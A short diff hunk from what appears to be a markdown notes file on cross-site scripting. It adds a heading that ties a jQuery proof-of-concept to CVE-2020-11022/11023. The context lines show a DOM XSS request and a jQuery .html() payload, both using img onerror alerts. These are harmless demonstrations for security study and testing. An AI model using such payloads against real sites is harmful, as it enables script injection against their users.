@@ -112,7 +112,7 @@ GET www.targeturl.com#<img src=x onerror"alert('DOM XSS')">
 ```
 
 
-## jQuery PoC's
+## jQuery PoC's  3.x (CVE-2020-11022/CVE-2020-11023)
 
 ```
 $('#div').html('<img alt="<x" title="/><img src=x onerror=alert(1)>">');
